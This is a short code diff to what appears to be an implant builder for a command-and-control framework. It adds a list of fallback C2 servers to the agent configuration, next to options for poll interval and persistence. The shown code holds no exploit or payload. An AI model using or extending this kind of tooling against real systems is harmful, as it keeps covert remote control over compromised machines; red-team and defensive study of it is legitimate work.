@@ -28,10 +28,12 @@ def build_agent(
     poll_interval: int = 5,
     agent_id: str = "",
     registration_token: str = "",
+    fallback_servers: list[str] | None = None,
 ) -> AgentBuildSpec:
     aid = agent_id or secrets.token_hex(12)
     config = {
         "c2_server": c2_server.rstrip("/"),
+        "fallback_servers": [s.rstrip("/") for s in (fallback_servers or [])],
         "agent_id": aid,
         "poll_interval": poll_interval,
         "max_poll_interval": 300,
@@ -69,11 +71,13 @@ def build_agent_wrapper_script(
     agent_id: str = "",
     persistence: bool = False,
     registration_token: str = "",
+    fallback_servers: list[str] | None = None,
 ) -> AgentBuildSpec:
     aid = agent_id or secrets.token_hex(12)
     config_json = json.dumps(
         {
             "c2_server": c2_server.rstrip("/"),
+            "fallback_servers": [s.rstrip("/") for s in (fallback_servers or [])],
             "agent_id": aid,
             "poll_interval": poll_interval,
             "max_poll_interval": 300,
